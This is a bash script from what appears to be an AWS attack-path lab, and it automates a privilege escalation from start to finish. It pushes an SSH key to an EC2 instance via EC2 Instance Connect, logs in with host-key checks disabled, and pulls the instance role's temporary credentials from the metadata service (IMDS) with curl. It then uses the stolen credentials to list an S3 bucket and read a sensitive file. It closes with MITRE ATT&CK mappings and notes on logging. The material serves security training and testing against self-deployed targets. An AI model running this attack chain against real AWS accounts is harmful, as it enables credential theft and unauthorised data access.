#!/bin/bash

# Demo script for ec2-instance-connect:SendSSHPublicKey privilege escalation to S3 bucket
# This scenario demonstrates how a user with ec2-instance-connect:SendSSHPublicKey can SSH into
# EC2 instances and extract S3 bucket access role credentials via IMDS


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ec2-003-to-bucket-starting-user"
EC2_BUCKET_ROLE="pl-prod-ec2-003-to-bucket-ec2-bucket-role"
SSH_KEY_FILE="/tmp/pathfinding_ec2_003_key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}EC2 Instance Connect to S3 Bucket Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_ec2_003_ec2_instance_connect_sendsshpublickey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_bucket_role_name')
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract bucket name from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Target Instance: $INSTANCE_ID"
echo "Target Role: $EC2_ROLE_NAME"
echo "Target Bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
# Save credentials for later use
ACCESS_KEY=$STARTING_ACCESS_KEY_ID
SECRET_KEY=$STARTING_SECRET_ACCESS_KEY

export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd aws sts get-caller-identity --query 'Account' --output text
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
echo "Attempting to access bucket: $TARGET_BUCKET"
show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 5: Discover target EC2 instance
echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
echo "Listing EC2 instances with their attached IAM roles..."
show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output text
INSTANCE_INFO=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' \
    --output text 2>/dev/null || echo "")

if [ -n "$INSTANCE_INFO" ]; then
    INSTANCE_ID_CONFIRM=$(echo $INSTANCE_INFO | awk '{print $1}')
    INSTANCE_STATE=$(echo $INSTANCE_INFO | awk '{print $2}')
    PUBLIC_IP=$(echo $INSTANCE_INFO | awk '{print $3}')
    INSTANCE_PROFILE=$(echo $INSTANCE_INFO | awk '{print $4}')

    echo "Instance ID: $INSTANCE_ID_CONFIRM"
    echo "State: $INSTANCE_STATE"
    echo "Public IP: $PUBLIC_IP"
    echo "Instance Profile: $INSTANCE_PROFILE"

    if [ "$INSTANCE_STATE" != "running" ]; then
        echo -e "${RED}Error: Instance is not in running state (current state: $INSTANCE_STATE)${NC}"
        echo "Please wait for the instance to be in 'running' state and try again."
        exit 1
    fi

    echo -e "${GREEN}✓ Found target instance with S3 access role${NC}"
else
    echo -e "${RED}Error: Could not describe instance${NC}"
    exit 1
fi
echo ""

# Step 6: Generate temporary SSH key pair
echo -e "${YELLOW}Step 6: Generating temporary SSH key pair${NC}"
echo "Creating RSA key pair for EC2 Instance Connect..."

# Remove old keys if they exist
rm -f ${SSH_KEY_FILE} ${SSH_KEY_FILE}.pub

# Generate new RSA key pair
ssh-keygen -t rsa -f ${SSH_KEY_FILE} -N '' -C "pathfinding-eic-demo" > /dev/null 2>&1

if [ ! -f "${SSH_KEY_FILE}.pub" ]; then
    echo -e "${RED}Error: Failed to generate SSH key pair${NC}"
    exit 1
fi

echo "Private key: ${SSH_KEY_FILE}"
echo "Public key: ${SSH_KEY_FILE}.pub"
echo -e "${GREEN}✓ Generated SSH key pair${NC}\n"

# Step 7: Push public key to EC2 instance using Instance Connect
echo -e "${YELLOW}Step 7: Pushing SSH public key to EC2 instance${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}EC2 INSTANCE CONNECT: SEND SSH PUBLIC KEY${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo "This is the privilege escalation vector!"
echo "The starting user has ec2-instance-connect:SendSSHPublicKey permission"
echo "which allows pushing a temporary SSH public key to the instance."
echo ""
echo -e "${YELLOW}The public key is valid for 60 seconds after pushing.${NC}"
echo ""

# Get the availability zone of the instance (required for SendSSHPublicKey)
show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text
AVAILABILITY_ZONE=$(aws ec2 describe-instances \
    --region $AWS_REGION \
    --instance-ids $INSTANCE_ID \
    --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' \
    --output text)

echo "Instance availability zone: $AVAILABILITY_ZONE"
echo "Pushing SSH public key to instance: $INSTANCE_ID"
echo ""

# Push the public key
show_attack_cmd aws ec2-instance-connect send-ssh-public-key --region $AWS_REGION --instance-id $INSTANCE_ID --instance-os-user ec2-user --availability-zone $AVAILABILITY_ZONE --ssh-public-key file://${SSH_KEY_FILE}.pub
aws ec2-instance-connect send-ssh-public-key \
    --region $AWS_REGION \
    --instance-id $INSTANCE_ID \
    --instance-os-user ec2-user \
    --availability-zone $AVAILABILITY_ZONE \
    --ssh-public-key file://${SSH_KEY_FILE}.pub

echo ""
echo -e "${GREEN}✓ Successfully pushed SSH public key to instance${NC}"
echo -e "${RED}⚠ KEY IS VALID FOR 60 SECONDS - SSH NOW!${NC}\n"

# Step 8: SSH into the instance and extract credentials non-interactively
echo -e "${YELLOW}Step 8: SSH into the instance and extract credentials (automated)${NC}"
echo ""
echo -e "${RED}⏰ IMPORTANT: We have 60 seconds to SSH and extract credentials!${NC}"
echo ""

# Build the SSH command to execute remotely
SSH_COMMAND='TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'

echo "Executing SSH command to extract credentials from IMDS..."
CREDS_JSON=$(ssh -i ${SSH_KEY_FILE} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 ec2-user@${PUBLIC_IP} "${SSH_COMMAND}" 2>/dev/null)

if [ $? -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to SSH into instance or extract credentials${NC}"
    echo "This could be due to:"
    echo "  - SSH connection timeout (60 second key expiration)"
    echo "  - Instance not ready for SSH"
    echo "  - Network connectivity issues"
    echo ""
    echo "Trying again with verbose output..."
    ssh -v -i ${SSH_KEY_FILE} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ec2-user@${PUBLIC_IP} "${SSH_COMMAND}"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials via SSH${NC}\n"

# Step 9: Parse and export extracted credentials
echo -e "${YELLOW}Step 9: Parsing and configuring extracted credentials${NC}"

EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId')
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey')
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token')

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Failed to parse credentials from JSON${NC}"
    echo "Received output:"
    echo "$CREDS_JSON"
    exit 1
fi

echo "Extracted Access Key ID: ${EXTRACTED_ACCESS_KEY:0:10}..."
echo "Switching to extracted credentials..."

export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION="$AWS_REGION"

# Verify new identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $NEW_IDENTITY"
echo -e "${GREEN}✓ Now using extracted EC2 bucket role credentials${NC}\n"

# Step 10: Use extracted credentials to access S3 bucket directly
echo -e "${YELLOW}Step 10: Using extracted credentials to access S3 bucket${NC}"
echo "The extracted EC2 instance role has S3 bucket access!"
echo "Target bucket: $TARGET_BUCKET"
echo ""

echo "Verifying we don't have direct access from starting user first..."
echo "Temporarily switching to starting user credentials..."

# Save extracted credentials
EXTRACTED_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
EXTRACTED_SECRET_ACCESS_KEY="$AWS_SECRET_ACCESS_KEY"
EXTRACTED_SESSION_TOKEN="$AWS_SESSION_TOKEN"

# Switch to starting user
export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
unset AWS_SESSION_TOKEN
export AWS_REGION="$AWS_REGION"

show_cmd aws sts get-caller-identity --query 'Arn' --output text
STARTING_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $STARTING_IDENTITY"

echo ""
echo "Attempting to list bucket as starting user (should fail)..."
show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
    echo -e "${YELLOW}⚠ Starting user has bucket access already (unexpected)${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Starting user cannot access bucket (as expected)${NC}"
fi

echo ""
echo "Now switching to extracted EC2 instance role credentials..."

# Switch back to extracted credentials
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_ACCESS_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION="$AWS_REGION"

show_cmd aws sts get-caller-identity --query 'Arn' --output text
NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $NEW_IDENTITY"
echo ""

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}ACCESSING S3 BUCKET WITH EXTRACTED CREDS${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

echo "Listing bucket contents..."
show_attack_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION; then
    echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
else
    echo -e "${RED}✗ Failed to list bucket${NC}"
    exit 1
fi

echo ""
echo "Reading sensitive data file..."
show_attack_cmd aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION
if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION; then
    echo -e "\n${GREEN}✓ Successfully read sensitive data!${NC}"
    echo -e "${GREEN}✓ BUCKET ACCESS ACHIEVED${NC}"
else
    echo -e "${RED}✗ Failed to read sensitive data${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ec2-instance-connect:SendSSHPublicKey permission)"
echo "2. Generated temporary SSH key pair"
echo "3. Pushed SSH public key to EC2 instance using Instance Connect: $INSTANCE_ID"
echo "4. Connected via SSH (public key valid for 60 seconds)"
echo "5. Extracted instance role credentials from metadata service (IMDSv2)"
echo "6. Used extracted credentials from: $EC2_BUCKET_ROLE"
echo "7. Achieved: Direct S3 Bucket Access to $TARGET_BUCKET using stolen credentials"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (ec2-instance-connect:SendSSHPublicKey) → EC2 Instance"
echo -e "  → (SSH + Extract via IMDS) → $EC2_BUCKET_ROLE credentials → S3 Bucket Access"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Temporary SSH key pair: ${SSH_KEY_FILE}"
echo "- SSH connection to instance: $INSTANCE_ID"
echo "- Extracted role: $EC2_BUCKET_ROLE"
echo "- Accessed bucket: $TARGET_BUCKET"

echo -e "\n${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "- T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
echo "- T1078.004: Valid Accounts: Cloud Accounts"
echo "- T1530: Data from Cloud Storage Object"

echo -e "\n${RED}⚠ Important Security Notes:${NC}"
echo "- EC2 Instance Connect logs the SendSSHPublicKey action in CloudTrail"
echo "- SSH connections are logged by the instance's syslog"
echo "- The temporary SSH key expires automatically after 60 seconds"
echo "- Instance role credentials extracted from IMDS are temporary and will expire"
echo "- This attack demonstrates credential theft, not persistent access modification"
echo "- S3 access is achieved using stolen temporary credentials, not by changing policies"

echo -e "\n${YELLOW}To clean up temporary files and environment:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
